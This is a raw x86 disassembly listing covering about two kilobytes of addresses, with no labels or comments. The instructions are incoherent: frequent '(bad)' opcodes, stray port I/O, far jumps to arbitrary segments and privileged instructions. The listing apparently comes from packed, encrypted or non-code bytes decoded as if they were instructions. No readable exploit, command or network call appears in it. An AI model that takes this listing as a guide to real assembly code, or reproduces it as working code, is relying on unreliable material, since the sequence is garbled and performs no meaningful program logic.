  41063a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41063b:	dec    ecx
  41063c:	mov    eax,ds:0xa2e9fc8e
  410641:	inc    edx
  410642:	or     eax,0xb9d5a8b
  410647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410648:	es jo  0x4105da
  41064b:	push   ebx
  41064c:	jl     0x4106c1
  41064e:	xchg   ebx,eax
  41064f:	add    eax,DWORD PTR [edx*1-0x10fa6f4a]
  410656:	js     0x4106ca
  410658:	add    DWORD PTR [ebx+eax*2-0x38],ebx
  41065c:	mov    dl,0xd5
  41065e:	js     0x4105f3
  410660:	mov    BYTE PTR [edx],dl
  410662:	push   edi
  410663:	(bad)  
  410664:	sbb    esp,DWORD PTR [eax+0x437ee096]
  41066a:	dec    edx
  41066b:	sub    bh,BYTE PTR [edx-0x310a7f7d]
  410671:	ja     0x4105ff
  410673:	rol    ebp,cl
  410675:	popf   
  410676:	mov    edx,0xf09d2ea4
  41067b:	out    0x16,al
  41067d:	enter  0xa98a,0x87
  410681:	xchg   esi,eax
  410682:	mov    ebp,0x7d059a0b
  410687:	bound  edi,QWORD PTR [ebp+0x47]
  41068a:	js     0x4106f2
  41068c:	mov    bh,BYTE PTR [ebx]
  41068e:	cld    
  41068f:	(bad)  
  410690:	fwait
  410691:	dec    eax
  410692:	test   BYTE PTR [eax],dh
  410694:	sub    ah,dh
  410696:	fcmovnbe st,st(1)
  410698:	ret    
  410699:	test   edx,edi
  41069b:	int    0x82
  41069d:	not    edx
  41069f:	cli    
  4106a0:	lea    ebp,[edi-0x35a9101]
  4106a6:	lahf   
  4106a7:	mov    ebx,0x38a33376
  4106ac:	mov    edi,0x36a7b4e0
  4106b1:	adc    al,0x45
  4106b3:	scas   eax,DWORD PTR es:[edi]
  4106b4:	loope  0x41063c
  4106b6:	mov    cl,0x4
  4106b8:	inc    edi
  4106b9:	loop   0x4106e1
  4106bb:	test   BYTE PTR [edi+ebx*2],0xa9
  4106bf:	xchg   ebp,eax
  4106c0:	test   DWORD PTR [esi+edi*4+0x48e42f7d],esp
  4106c7:	les    edi,FWORD PTR [edi+ecx*8]
  4106ca:	ret    0xd8d2
  4106cd:	fimul  DWORD PTR [ecx-0x7672c913]
  4106d3:	inc    esi
  4106d4:	sub    eax,DWORD PTR [esi+0x34]
  4106d7:	cmp    DWORD PTR [ecx+0x7e],esi
  4106da:	outs   dx,BYTE PTR ds:[esi]
  4106db:	xchg   ebx,eax
  4106dc:	inc    edx
  4106dd:	jmp    0x41069e
  4106df:	pop    es
  4106e0:	pop    ecx
  4106e1:	ror    DWORD PTR [edi],0x50
  4106e4:	xchg   ecx,eax
  4106e5:	lods   eax,DWORD PTR ds:[esi]
  4106e6:	hlt    
  4106e7:	xchg   ecx,eax
  4106e8:	cmp    eax,0x3779d62b
  4106ed:	inc    eax
  4106ee:	mov    edi,0x41b4dcd5
  4106f3:	outs   dx,DWORD PTR ds:[esi]
  4106f4:	mov    ah,BYTE PTR [esi]
  4106f6:	ins    BYTE PTR es:[edi],dx
  4106f7:	ins    DWORD PTR es:[edi],dx
  4106f8:	push   edi
  4106f9:	xlat   BYTE PTR ds:[ebx]
  4106fa:	cmp    BYTE PTR [esi],0xf3
  4106fd:	outs   dx,BYTE PTR ds:[esi]
  4106fe:	pop    edx
  4106ff:	or     BYTE PTR [ecx+ecx*8-0x2d],al
  410703:	dec    ecx
  410704:	mov    DWORD PTR [edi+eiz*1-0x2fb9c3f4],ebx
  41070b:	imul   edx,DWORD PTR [ebx+0xa11a745],0x3d36d2f3
  410715:	xor    al,0x2
  410717:	jl     0x410699
  410719:	cli    
  41071a:	jmp    0x410706
  41071c:	sbb    eax,0x372f63b0
  410721:	push   0x836d5d58
  410726:	sbb    BYTE PTR [edx],ah
  410728:	ror    BYTE PTR [ebp-0x610f318],1
  41072e:	sti    
  41072f:	pop    ss
  410730:	xchg   esi,eax
  410731:	and    ah,BYTE PTR [edx-0xe4ed325]
  410737:	or     eax,DWORD PTR [ebx+0x34]
  41073a:	out    0x32,eax
  41073c:	in     al,dx
  41073d:	mov    ds:0x3e29bc99,al
  410742:	mov    al,0x58
  410744:	leave  
  410745:	jnp    0x4107b9
  410747:	pop    ecx
  410748:	enter  0xd156,0x9
  41074c:	mov    bh,0xe8
  41074e:	add    BYTE PTR [ebp+0x9020b57],dh
  410754:	push   es
  410755:	jb     0x4107a8
  410757:	cmp    al,0xad
  410759:	sbb    bl,BYTE PTR [edx-0x11]
  41075c:	adc    eax,0xd4476753
  410761:	jl     0x410707
  410763:	cli    
  410764:	outs   dx,DWORD PTR ds:[esi]
  410765:	in     al,0x35
  410767:	push   ebx
  410768:	add    BYTE PTR [esi+0x72],dh
  41076b:	pop    edx
  41076c:	pop    edx
  41076d:	sbb    ch,BYTE PTR [ebx]
  41076f:	ror    DWORD PTR [edi-0x47],0x4a
  410773:	fscale 
  410775:	push   esp
  410776:	or     eax,0xdb3a1ad9
  41077b:	lods   eax,DWORD PTR ds:[esi]
  41077c:	xor    eax,0x966b682
  410781:	xlat   BYTE PTR ds:[ebx]
  410782:	mov    ds:0xae73de47,al
  410787:	int    0x65
  410789:	mov    dl,0xdd
  41078b:	add    ebp,DWORD PTR [ebx-0x3f]
  41078e:	xchg   ebx,eax
  41078f:	dec    ebp
  410790:	out    0xcd,eax
  410792:	pop    ss
  410793:	ret    0xd710
  410796:	(bad)  
  410797:	jge    0x41071d
  410799:	inc    esp
  41079a:	add    BYTE PTR ds:0xab8570e9,al
  4107a0:	pusha  
  4107a1:	pop    eax
  4107a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107a3:	std    
  4107a4:	js     0x41074f
  4107a6:	aam    0x0
  4107a8:	ins    DWORD PTR es:[edi],dx
  4107a9:	lea    eax,[esi+0x22da6fef]
  4107af:	xor    eax,0xbe05fb7b
  4107b4:	arpl   WORD PTR [esi+0x76cae8d2],cx
  4107ba:	push   es
  4107bb:	outs   dx,BYTE PTR ds:[esi]
  4107bc:	call   0x141235d8
  4107c1:	bnd jae 0x4107f5
  4107c4:	inc    ebp
  4107c5:	adc    bh,BYTE PTR [edx-0x65]
  4107c8:	cld    
  4107c9:	cmp    eax,0x63649a69
  4107ce:	in     al,0x8f
  4107d0:	adc    BYTE PTR [edx+ebp*4-0x7],dh
  4107d4:	jmp    0xd184:0x7dfe73d3
  4107db:	into   
  4107dc:	sub    ch,dl
  4107de:	and    DWORD PTR [edx+0x0],edi
  4107e1:	in     al,0xb3
  4107e3:	dec    ebx
  4107e4:	cmp    edi,ebp
  4107e6:	xor    ecx,edi
  4107e8:	mov    ebp,0x87418f8d
  4107ed:	sbb    BYTE PTR [esi],dl
  4107ef:	js     0x4107e6
  4107f1:	and    al,0x70
  4107f3:	lock jmp 0x41084e
  4107f6:	inc    ecx
  4107f7:	inc    ebp
  4107f8:	sub    esi,esi
  4107fa:	and    BYTE PTR [ebx+0x2c5e0d75],bl
  410800:	sbb    BYTE PTR [eax],0xaf
  410803:	xchg   al,ch
  410805:	cmp    al,BYTE PTR [edx+0x74c44041]
  41080b:	(bad)  
  41080d:	sbb    eax,0xd573a988
  410813:	sbb    DWORD PTR [ebx],0xffffff90
  410816:	add    al,0xa
  410818:	ret    0xcc64
  41081b:	call   DWORD PTR [edi+0x25]
  41081e:	jle    0x410856
  410820:	sbb    dl,BYTE PTR [esi]
  410822:	cdq    
  410823:	jecxz  0x410809
  410825:	popf   
  410826:	retf   0x31e8
  410829:	sbb    al,0xb1
  41082b:	lods   eax,DWORD PTR ds:[esi]
  41082c:	fisubr WORD PTR [ebx+0x2f]
  41082f:	into   
  410830:	jmp    0x847b:0x911a0903
  410837:	mov    al,ds:0x21ff01d8
  41083c:	mov    esi,0x4d8fb7f1
  410841:	sti    
  410842:	xchg   edx,eax
  410843:	popa   
  410844:	add    al,0x3f
  410846:	test   eax,0x189d0a80
  41084b:	arpl   WORD PTR [ecx+0x7b74386],bx
  410851:	enter  0xbc64,0xad
  410855:	jb     0x41089e
  410857:	sub    ah,bl
  410859:	(bad)  
  41085c:	add    dh,BYTE PTR [ecx]
  41085e:	and    DWORD PTR [edi-0x3],0x27
  410862:	imul   esi,DWORD PTR [esi+edx*1-0x74],0x3f
  410867:	jmp    0x6b095ea4
  41086c:	idiv   esp
  41086e:	fdivr  QWORD PTR [esp]
  410871:	les    ebp,FWORD PTR [eax]
  410873:	jecxz  0x410848
  410875:	push   esi
  410876:	jae    0x410826
  410878:	jb     0x4108b0
  41087a:	cs ins DWORD PTR es:[edi],dx
  41087c:	mov    ss,esi
  41087e:	jge    0x4108fa
  410880:	xor    ch,BYTE PTR [esi]
  410882:	loop   0x41082b
  410884:	mov    ebp,0x56dca85e
  410889:	or     ecx,DWORD PTR [ebp-0x684d838c]
  41088f:	jmp    0x4108b2
  410891:	aam    0x24
  410893:	mov    eax,ds:0x1f6d3e95
  410898:	(bad)  
  410899:	adc    BYTE PTR ds:0x5852ec4b,al
  41089f:	mov    al,ds:0x127ad6e5
  4108a4:	neg    DWORD PTR [ebx-0x7e]
  4108a7:	cs je  0x41091c
  4108aa:	rol    al,1
  4108ac:	ss pop ebp
  4108ae:	or     BYTE PTR [edi-0x7],0x92
  4108b2:	sub    esi,ecx
  4108b4:	mov    bh,0x13
  4108b6:	sahf   
  4108b7:	scas   eax,DWORD PTR es:[edi]
  4108b8:	xor    DWORD PTR [esi-0x74],ebx
  4108bb:	sbb    BYTE PTR [eax-0x3098f4de],cl
  4108c1:	(bad)  
  4108c2:	and    al,0xd9
  4108c4:	and    al,0x43
  4108c6:	mov    edx,0xb8f0c4f2
  4108cb:	sti    
  4108cc:	jle    0x410938
  4108ce:	push   ebp
  4108cf:	pop    eax
  4108d0:	jecxz  0x410919
  4108d2:	and    BYTE PTR [ebx],dh
  4108d4:	sbb    ebx,DWORD PTR [esi]
  4108d6:	fidiv  DWORD PTR [eax]
  4108d8:	fwait
  4108d9:	mov    dh,al
  4108db:	leave  
  4108dc:	stos   DWORD PTR es:[edi],eax
  4108dd:	dec    esp
  4108de:	scas   al,BYTE PTR es:[edi]
  4108df:	shr    BYTE PTR [edi+0x49],cl
  4108e2:	test   DWORD PTR [ebx+0x75432a5f],0xf2ba51b3
  4108ec:	lahf   
  4108ed:	mov    ebx,0x7ca62495
  4108f2:	test   DWORD PTR [edi],eax
  4108f4:	fidivr WORD PTR [ebx-0x16478d97]
  4108fa:	xchg   BYTE PTR ds:0x7a393852,ah
  410900:	pushf  
  410901:	mov    WORD PTR [ecx],fs
  410903:	jge    0x410888
  410905:	jns    0x41097e
  410907:	shl    DWORD PTR [eax+eiz*4],0xde
  41090b:	dec    ecx
  41090c:	pop    ds
  41090d:	clc    
  41090e:	out    0x5,eax
  410910:	lock push ss
  410912:	mov    cl,0xdb
  410914:	bsr    esi,DWORD PTR [edi-0x38]
  410918:	xor    esp,edi
  41091a:	push   edx
  41091b:	xchg   esi,eax
  41091c:	mov    edx,ecx
  41091e:	hlt    
  41091f:	(bad)  
  410921:	jo     0x4108a5
  410923:	mov    bh,0x4
  410925:	dec    esi
  410926:	sahf   
  410927:	popa   
  410928:	dec    edx
  410929:	inc    eax
  41092a:	mov    DWORD PTR [ebp-0x27],ecx
  41092d:	xor    al,0x3f
  41092f:	or     DWORD PTR [ecx+ecx*4],esi
  410932:	loopne 0x4108cf
  410934:	es push eax
  410936:	add    eax,0x7d23129
  41093b:	jp     0x410980
  41093d:	pop    eax
  41093e:	repz popa 
  410940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410941:	xchg   edi,eax
  410942:	push   edi
  410943:	jae    0x41094a
  410945:	jecxz  0x410979
  410947:	bound  ecx,QWORD PTR [eax-0x67da5bb0]
  41094d:	das    
  41094e:	pop    esp
  41094f:	mov    esp,0xd6915b58
  410954:	dec    eax
  410955:	dec    ecx
  410956:	adc    DWORD PTR [eax-0x650ca4db],ebx
  41095c:	inc    esp
  41095d:	jp     0x410928
  41095f:	mov    edx,DWORD PTR [edx+0x2e]
  410962:	ficom  DWORD PTR [eax+0x5f]
  410965:	xchg   ecx,eax
  410966:	xchg   ebp,eax
  410967:	and    DWORD PTR [eax+0x1a],0xfffffff4
  41096b:	jne    0x410924
  41096d:	xchg   ecx,eax
  41096e:	loope  0x410948
  410970:	shl    DWORD PTR [esi-0x572ccccb],cl
  410976:	and    ch,al
  410978:	mov    ebx,0x51a54323
  41097d:	mov    ds:0x8a165eb3,al
  410982:	or     al,0xa9
  410984:	mov    DWORD PTR [edx-0x73731c1d],esi
  41098a:	cmp    eax,DWORD PTR [eax]
  41098c:	push   0x9dc1386d
  410991:	adc    bl,cl
  410993:	ret    0x9d99
  410996:	xor    esp,ebx
  410998:	sbb    al,0x77
  41099a:	data16 je 0x410957
  41099d:	data16 mov BYTE PTR [ebx-0x3f],ah
  4109a1:	scas   eax,DWORD PTR es:[edi]
  4109a2:	mov    ch,0x2b
  4109a4:	pusha  
  4109a5:	leave  
  4109a6:	inc    ebx
  4109a7:	fsub   DWORD PTR [eax+esi*1]
  4109aa:	and    al,0xed
  4109ac:	mov    esp,0x29dfc8c9
  4109b1:	cmp    al,0xf7
  4109b3:	dec    ebx
  4109b4:	repz and al,0xf4
  4109b7:	sbb    ebx,edx
  4109b9:	inc    edx
  4109ba:	cmp    BYTE PTR [ebp+0x48],al
  4109bd:	xchg   esi,eax
  4109be:	sub    DWORD PTR [ecx],0xbd2f6a5e
  4109c4:	clc    
  4109c5:	mov    ebp,0x570dc186
  4109ca:	scas   al,BYTE PTR es:[edi]
  4109cb:	test   al,0x8a
  4109cd:	mov    eax,ds:0xe1570c43
  4109d2:	cmp    bh,BYTE PTR [ebx-0x7a8bfb5b]
  4109d8:	in     eax,dx
  4109d9:	jl     0x4109ef
  4109db:	test   DWORD PTR [ebx+0x1d5bb66d],eax
  4109e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109e2:	dec    eax
  4109e3:	and    al,0x90
  4109e5:	int3   
  4109e6:	imul   ebx,DWORD PTR [edx+0x20],0xffffff9b
  4109ea:	cs mov dh,0xe
  4109ed:	repnz sbb eax,0x45e6fba6
  4109f3:	call   0x8a25ecbd
  4109f8:	push   edx
  4109f9:	xchg   esp,eax
  4109fa:	xor    eax,0x11889923
  4109ff:	cmp    BYTE PTR [edx+0x17],0x33
  410a03:	adc    eax,0x63dee529
  410a08:	sbb    al,0x7e
  410a0a:	and    BYTE PTR [esi-0x2dbe525c],dh
  410a10:	test   ebx,ebx
  410a12:	out    0xfd,al
  410a14:	jge    0x410a92
  410a16:	arpl   WORD PTR [eax-0x315653bb],di
  410a1c:	dec    esp
  410a1d:	nop
  410a1e:	pop    edi
  410a1f:	xor    al,0x69
  410a21:	or     DWORD PTR [esi+0x25],esp
  410a24:	sbb    al,0xf2
  410a26:	mov    ah,0xd6
  410a28:	inc    eax
  410a29:	ja     0x4109b7
  410a2b:	je     0x410a64
  410a2d:	pop    edi
  410a2e:	mov    al,ds:0x3109b967
  410a33:	jmp    0xbead:0x8d5b6063
  410a3a:	test   BYTE PTR [edx-0x5c],al
  410a3d:	sub    DWORD PTR [edx-0x6f2d2740],edi
  410a43:	sub    DWORD PTR [edx],eax
  410a45:	jns    0x4109c9
  410a47:	xchg   edx,eax
  410a48:	adc    ch,dh
  410a4a:	jno    0x4109e1
  410a4c:	xor    al,BYTE PTR [edx-0x22]
  410a4f:	ins    DWORD PTR es:[edi],dx
  410a50:	sti    
  410a51:	push   esp
  410a52:	call   0x4b21:0xcab5d4f
  410a59:	fwait
  410a5a:	sbb    ecx,ebp
  410a5c:	mov    ah,0x42
  410a5e:	aad    0xb0
  410a60:	std    
  410a61:	or     dl,BYTE PTR [ebx]
  410a63:	je     0x410a80
  410a65:	mov    cl,0xe7
  410a67:	das    
  410a68:	jne    0x410a6f
  410a6a:	jg     0x410ac1
  410a6c:	ret    
  410a6d:	inc    edi
  410a6e:	dec    edi
  410a6f:	(bad)  
  410a70:	xor    ah,dl
  410a72:	adc    DWORD PTR [esi-0x46884ea5],ebx
  410a78:	push   0xbdd82782
  410a7d:	imul   edi,DWORD PTR [esi-0x1cfffbd6],0xffffff81
  410a84:	mov    edi,0xfb6e841b
  410a89:	xor    DWORD PTR [ebp-0x4b],esi
  410a8c:	jp     0x410a19
  410a8e:	xchg   edi,eax
  410a8f:	aaa    
  410a90:	push   ecx
  410a91:	or     DWORD PTR [eax+0x67],edi
  410a94:	lahf   
  410a95:	pop    esp
  410a96:	xchg   DWORD PTR [esp+edx*2+0x6f],eax
  410a9a:	and    BYTE PTR [edi+0x30],0xad
  410a9e:	out    dx,eax
  410a9f:	adc    al,BYTE PTR [eax+esi*1+0x32e40660]
  410aa6:	lods   al,BYTE PTR ds:[esi]
  410aa7:	mov    ebx,0x61ade2dd
  410aac:	arpl   bx,bp
  410aae:	xor    eax,0xebcc787b
  410ab3:	ss push edx
  410ab5:	cmp    al,0x2
  410ab7:	add    al,0xe5
  410ab9:	jecxz  0x410a94
  410abb:	xor    ebp,edi
  410abd:	rol    DWORD PTR [esi],1
  410abf:	fidivr WORD PTR [ebp+eax*4+0x30]
  410ac3:	mov    ebp,0xa3bb81e9
  410ac8:	rol    DWORD PTR [eax],1
  410aca:	fisttp QWORD PTR [esi]
  410acc:	cmp    eax,0x5227fb4c
  410ad1:	push   esp
  410ad2:	push   ecx
  410ad3:	jnp    0x410b44
  410ad5:	out    0x33,al
  410ad7:	fucomi st,st(3)
  410ad9:	push   0xffffffb0
  410adb:	adc    bh,BYTE PTR [edi-0x2d]
  410ade:	mov    eax,0x69ba3451
  410ae3:	mov    ch,0xf9
  410ae5:	push   es
  410ae6:	aad    0xf
  410ae8:	ja     0x410ad4
  410aea:	adc    dl,al
  410aec:	xchg   ebx,eax
  410aed:	mov    dl,0x96
  410aef:	je     0x410ac2
  410af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410af2:	xchg   ebp,eax
  410af3:	cmp    DWORD PTR [edi+0x4d],esp
  410af6:	enter  0x3df4,0xa0
  410afa:	pop    edx
  410afb:	(bad)  
  410afc:	cdq    
  410afd:	dec    esi
  410afe:	sbb    cl,0x38
  410b01:	popf   
  410b02:	mov    eax,ds:0x3a177e13
  410b07:	sbb    DWORD PTR [ecx-0x9],ecx
  410b0a:	push   0xffffffc7
  410b0c:	jae    0x410b5c
  410b0e:	pop    ecx
  410b0f:	adc    al,0x2e
  410b11:	xchg   DWORD PTR [ebx+0x329aa898],esi
  410b17:	inc    ebx
  410b18:	adc    BYTE PTR [ebx-0x3d],ah
  410b1b:	xchg   edx,eax
  410b1c:	shl    DWORD PTR [ecx+0x93aac14],1
  410b22:	mov    ebp,eax
  410b24:	mov    DWORD PTR [edx+0x7ed38e13],0xcd804d5a
  410b2e:	retf   
  410b2f:	mov    cl,0x5e
  410b31:	xchg   esi,eax
  410b32:	cmc    
  410b33:	loope  0x410b2e
  410b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b36:	iret   
  410b37:	or     ecx,DWORD PTR [ecx]
  410b39:	and    DWORD PTR [eax-0x20500c1],ebx
  410b3f:	dec    ebp
  410b40:	or     DWORD PTR [edi-0x5332e7c4],0xffffffc8
  410b47:	das    
  410b48:	mov    edi,0xf97f618
  410b4d:	repnz sbb edi,DWORD PTR [ebx]
  410b50:	xor    BYTE PTR [ebx+0x56],bh
  410b53:	hlt    
  410b54:	lods   al,BYTE PTR ds:[esi]
  410b55:	fwait
  410b56:	int3   
  410b57:	adc    eax,0xe9b3a19c
  410b5c:	adc    edi,0x5d
  410b5f:	arpl   WORD PTR [ebp-0x26c6aed1],sp
  410b65:	and    al,0xb7
  410b67:	aas    
  410b68:	fst    DWORD PTR [edi]
  410b6a:	retf   
  410b6b:	enter  0x85f9,0xe7
  410b6f:	cwde   
  410b70:	cwde   
  410b71:	retf   0x7d9b
  410b74:	hlt    
  410b75:	inc    ebp
  410b76:	icebp  
  410b77:	mov    eax,ds:0xbb5a5e3e
  410b7c:	ds or  al,0x5c
  410b7f:	(bad)  
  410b80:	jmp    0x410b56
  410b82:	jmp    0x410bd5
  410b84:	jno    0x410bf1
  410b86:	push   0xbf5710c5
  410b8b:	sbb    eax,0xff7ba3bf
  410b90:	adc    ch,bh
  410b92:	mov    esi,0xc4d8cfa3
  410b97:	je     0x410b1e
  410b99:	call   FWORD PTR [edi]
  410b9b:	xchg   edi,eax
  410b9c:	mov    al,BYTE PTR [bx+di]
  410b9f:	leave  
  410ba0:	dec    esi
  410ba1:	dec    edx
  410ba2:	fmul   st(6),st
  410ba4:	je     0x410b76
  410ba6:	scas   eax,DWORD PTR es:[edi]
  410ba7:	test   al,0xaf
  410ba9:	pop    edx
  410baa:	cmp    bl,ah
  410bac:	outs   dx,BYTE PTR ds:[esi]
  410bad:	jo     0x410bdc
  410baf:	ror    DWORD PTR [ecx+ebp*8-0x4bd08a43],1
  410bb6:	push   ds
  410bb7:	add    eax,0xdb22693c
  410bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bbd:	sti    
  410bbe:	rep outs dx,DWORD PTR ds:[esi]
  410bc0:	pop    ebp
  410bc1:	in     eax,dx
  410bc2:	jl     0x410b55
  410bc4:	add    al,cl
  410bc6:	push   edi
  410bc7:	jo     0x410bb2
  410bc9:	adc    BYTE PTR [edx+esi*1-0x5c],cl
  410bcd:	call   FWORD PTR [edx-0x935f14d]
  410bd3:	cmp    edx,DWORD PTR [ecx+0x479db382]
  410bd9:	in     eax,dx
  410bda:	sub    dl,BYTE PTR [ebp+0x16]
  410bdd:	push   esi
  410bde:	jbe    0x410bbe
  410be0:	xor    DWORD PTR [esi+0x3f619063],esi
  410be6:	aad    0xf2
  410be8:	mov    ch,0xa3
  410bea:	xor    al,0x7f
  410bec:	lods   eax,DWORD PTR ds:[esi]
  410bed:	iret   
  410bee:	gs test al,0xca
  410bf1:	xchg   ebp,eax
  410bf2:	loopne 0x410c61
  410bf4:	inc    ecx
  410bf5:	(bad)  
  410bf6:	xor    BYTE PTR [eax-0x1e],ah
  410bf9:	xchg   ebp,eax
  410bfa:	mov    ebx,0xfbdff2bd
  410bff:	mov    eax,ds:0x7ba73de7
  410c04:	dec    ebp
  410c05:	stos   DWORD PTR es:[edi],eax
  410c06:	into   
  410c07:	and    ebp,DWORD PTR [esi+0x55]
  410c0a:	(bad)  [ebp+0x7763e911]
  410c10:	out    dx,al
  410c11:	and    edx,ebx
  410c13:	fst    QWORD PTR [ebp-0x4552c707]
  410c19:	xor    eax,DWORD PTR [ecx+0x3c]
  410c1c:	addr16 dec ecx
  410c1e:	cdq    
  410c1f:	xor    al,0x9a
  410c21:	lods   eax,DWORD PTR ds:[esi]
  410c22:	loop   0x410bf5
  410c24:	enter  0xf436,0xe8
  410c28:	retf   0x2af4
  410c2b:	cwde   
  410c2c:	in     eax,dx
  410c2d:	sbb    al,BYTE PTR [edi+0x40ff61]
  410c33:	je     0x410cad
  410c35:	and    eax,0xe4ac9ca6
  410c3a:	jmp    0x35885968
  410c3f:	cmp    ebx,esi
  410c41:	sbb    BYTE PTR [eax],0x47
  410c44:	pop    ebp
  410c45:	add    ah,BYTE PTR [esp+ebx*4+0x518ca59c]
  410c4c:	inc    edi
  410c4d:	push   cs
  410c4e:	cmp    BYTE PTR [ecx+edx*8+0x17],cl
  410c52:	out    0x5e,eax
  410c54:	adc    dl,dh
  410c56:	push   ebp
  410c57:	mov    ds:0x95807980,al
  410c5c:	stc    
  410c5d:	not    DWORD PTR ds:0x98c83747
  410c63:	sub    eax,0xb6d3e2b3
  410c68:	xchg   DWORD PTR [eax],ebp
  410c6a:	inc    esp
  410c6b:	mov    eax,0xb077d5ad
  410c70:	xchg   esi,eax
  410c71:	call   0x504c:0xc4c3445f
  410c78:	sti    
  410c79:	test   DWORD PTR [ecx-0x28a61010],eax
  410c7f:	in     al,0x41
  410c81:	shl    DWORD PTR [edi-0x7a1f34c0],cl
  410c87:	mov    esi,0x48a7a3e5
  410c8c:	aad    0xbf
  410c8e:	jecxz  0x410caf
  410c90:	fist   WORD PTR [edi-0x71]
  410c93:	inc    BYTE PTR [esi+0xbb1a349]
  410c99:	int3   
  410c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c9b:	aaa    
  410c9c:	fs aam 0x12
  410c9f:	push   edx
  410ca0:	mov    bl,0x85
  410ca2:	inc    edx
  410ca3:	outs   dx,BYTE PTR ds:[esi]
  410ca4:	adc    BYTE PTR [edi],0xdf
  410ca7:	pop    ss
  410ca8:	add    eax,0xcdc64bd5
  410cad:	jo     0x410c91
  410caf:	pop    esi
  410cb0:	mov    edx,0x828dc873
  410cb5:	inc    ecx
  410cb6:	in     eax,0x3a
  410cb8:	scas   eax,DWORD PTR es:[edi]
  410cb9:	dec    edx
  410cba:	inc    ebx
  410cbb:	jo     0x410ca5
  410cbd:	fdivr  DWORD PTR [ecx]
  410cbf:	mov    al,ds:0x892477d0
  410cc4:	sub    al,0xad
  410cc6:	adc    al,0x49
  410cc8:	cmc    
  410cc9:	xor    al,0x85
  410ccb:	mov    cl,0xf5
  410ccd:	scas   al,BYTE PTR es:[edi]
  410cce:	or     ch,bh
  410cd0:	sbb    edx,DWORD PTR [edi]
  410cd2:	mov    bh,0x34
  410cd4:	fwait
  410cd5:	push   0xfffffffd
  410cd7:	or     dl,ah
  410cd9:	test   eax,0xf18db7d4
  410cde:	stos   BYTE PTR es:[edi],al
  410cdf:	mov    ds:0x6cace3a2,al
  410ce4:	xchg   esp,eax
  410ce5:	fimul  DWORD PTR [eax-0x61]
  410ce8:	mov    al,0x3d
  410cea:	inc    ecx
  410ceb:	pop    ss
  410cec:	test   bl,0x3e
  410cef:	call   0xf04:0x5b9f5006
  410cf6:	inc    edx
  410cf7:	jo     0x410d0a
  410cf9:	(bad)  
  410cfa:	aas    
  410cfb:	retf   
  410cfc:	es sti 
  410cfe:	jmp    0x3b250318
  410d03:	lock or ch,ah
  410d06:	icebp  
  410d07:	out    dx,eax
  410d08:	adc    esi,DWORD PTR cs:[ebp-0x2c]
  410d0c:	and    esp,DWORD PTR [ebx+0x2486a42b]
  410d12:	add    ch,BYTE PTR [esi+0x3085e568]
  410d18:	push   ds
  410d19:	in     eax,dx
  410d1a:	ret    0x399e
  410d1d:	lods   al,BYTE PTR ds:[esi]
  410d1e:	pop    edi
  410d1f:	ret    0xa0cf
  410d22:	jl     0x410cf8
  410d24:	addr16 and al,0xa5
  410d27:	xor    ecx,DWORD PTR [eax+0x51]
  410d2a:	sbb    al,0x57
  410d2c:	mov    edx,0xdc2a9a70
  410d31:	jle    0x410d16
  410d33:	inc    ebx
  410d34:	lock mov bl,0xa9
  410d37:	scas   eax,DWORD PTR es:[edi]
  410d38:	mov    ds:0xc1658b45,al
  410d3d:	in     eax,dx
  410d3e:	frstor [ecx-0x261d27df]
  410d44:	(bad)  [edx-0x25c0f12f]
  410d4a:	add    eax,0x92bb0ed
  410d4f:	test   BYTE PTR [esi+0x42],bl
  410d52:	int    0x7b
  410d54:	call   0x31df:0x332130ea
  410d5b:	mov    esi,0x20963746
  410d60:	test   eax,0xdc121e07
  410d65:	gs push edi
  410d67:	sub    edi,edi
  410d69:	xor    al,0xf4
  410d6b:	xchg   ecx,eax
  410d6c:	rcr    BYTE PTR [ecx+0x52],cl
  410d6f:	test   eax,0x6a69598b
  410d74:	inc    eax
  410d75:	sbb    esp,DWORD PTR ds:0x4d9d4657
  410d7b:	test   DWORD PTR [edx-0x2939275c],0xf5fd54a8
  410d85:	in     eax,0x20
  410d87:	jmp    0x5443:0xc13740c8
  410d8e:	xchg   ebx,eax
  410d8f:	cli    
  410d90:	jle    0x410de0
  410d92:	shr    eax,0xc0
  410d95:	test   eax,0x61a937ea
  410d9a:	lea    edi,[esp+ecx*1+0x4d3d16e8]
  410da1:	push   esp
  410da2:	mov    ds:0x10d2351b,eax
  410da7:	pop    ebp
  410da8:	adc    eax,0xa3ce407f
  410dad:	mov    ebp,0x876db07a
  410db2:	xor    al,0xfb
  410db4:	lods   al,BYTE PTR ds:[esi]
  410db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db6:	sub    esp,esi
  410db8:	xchg   ebp,eax
  410db9:	test   al,0xf8
  410dbb:	(bad)  
  410dbd:	push   edx
  410dbe:	mov    esp,0x2624c266
  410dc3:	std    
  410dc4:	(bad)  
  410dc5:	in     al,dx
  410dc6:	aam    0x6f
  410dc8:	pop    eax
  410dc9:	(bad)  
  410dca:	fsubr  st(2),st
  410dcc:	inc    ebp
  410dcd:	xor    BYTE PTR [esi+ecx*2+0x29],dh
  410dd1:	retf   0xa12d
  410dd4:	add    DWORD PTR ds:0x6dddc64c,0xffffffa3
  410ddb:	adc    BYTE PTR [ecx+edx*4+0x506755f6],bh
  410de2:	pop    esi
  410de3:	into   
  410de4:	in     eax,0x9b
  410de6:	repz sub al,0x93
  410de9:	fidiv  WORD PTR [esi+0x45]
  410dec:	outs   dx,DWORD PTR ds:[esi]
  410ded:	cs cli 
  410def:	pushf  
  410df0:	retf   0xc81b
  410df3:	sbb    DWORD PTR [edx+0x2a35725e],0xffffff8c
  410dfa:	in     eax,0x3d
  410dfc:	mov    ds:0xd8917eb2,eax
  410e01:	test   DWORD PTR [edx+0x29],edx
  410e04:	rcl    BYTE PTR [edx+0xc4a99a5],0x36
  410e0b:	test   DWORD PTR [ebx-0x1e],edi
  410e0e:	cmp    eax,0xdd2476b3
  410e13:	cmp    ebx,ebx
  410e15:	and    cl,al
  410e17:	mov    eax,ds:0x937a82e3
  410e1c:	cli    
  410e1d:	icebp  
  410e1e:	jg     0x410e30
  410e20:	xchg   esp,eax
